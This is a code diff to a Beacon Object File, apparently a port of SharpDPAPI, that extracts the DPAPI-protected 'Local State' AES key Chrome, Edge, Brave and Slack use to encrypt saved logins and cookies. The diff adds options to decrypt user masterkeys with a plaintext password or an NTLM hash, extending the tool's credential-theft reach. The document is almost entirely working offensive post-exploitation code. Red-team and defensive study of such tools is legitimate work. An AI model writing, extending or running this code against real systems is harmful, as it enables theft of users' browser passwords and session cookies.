@@ -2,10 +2,11 @@
  * chrome_statekeys.c — BOF for Chrome state key extraction
  *
  * Usage:
- *   chrome_statekeys [/pvk:BASE64] [/credkey:KEY] [/server:SERVER]
- *                    [/target:PATH] [/unprotect] [/rpc]
+ *   chrome_statekeys [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
+ *                    [/credkey:KEY] [/server:SERVER] [/target:PATH]
+ *                    [/browser:X] [/unprotect] [/rpc]
  *
- * Extracts the Chrome/Edge "Local State" AES encryption key,
+ * Extracts the Chrome/Edge/Brave/Slack "Local State" AES encryption key,
  * which is DPAPI-protected and used to encrypt login/cookie data
  * in Chrome v80+.
  */
@@ -20,9 +21,12 @@ void go(char* args, int args_len) {
     BeaconDataParse(&parser, args, args_len);
 
     char* pvk_b64    = BeaconDataExtract(&parser, NULL);
+    char* password   = BeaconDataExtract(&parser, NULL);
+    char* ntlm       = BeaconDataExtract(&parser, NULL);
     char* credkey    = BeaconDataExtract(&parser, NULL);
     char* server_str = BeaconDataExtract(&parser, NULL);
     char* target_str = BeaconDataExtract(&parser, NULL);
+    char* browser    = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
     int   use_rpc    = BeaconDataInt(&parser);
 
@@ -35,6 +39,9 @@ void go(char* args, int args_len) {
     wchar_t* server = NULL;
     if (target_str && strlen(target_str) > 0) target = utf8_to_wide(target_str);
     if (server_str && strlen(server_str) > 0) server = utf8_to_wide(server_str);
+
+    /* Note: browser arg reserved for future use */
+    (void)browser;
 
     MASTERKEY_CACHE cache;
     mk_cache_init(&cache);
@@ -63,9 +70,13 @@ void go(char* args, int args_len) {
         }
     }
 
-    if (pvk || use_rpc) {
+    if (pvk || use_rpc ||
+        (password && strlen(password) > 0) ||
+        (ntlm && strlen(ntlm) > 0)) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
+            (password && strlen(password) > 0) ? password : NULL,
+            (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
+            NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome State Keys (BOF) ===\n");
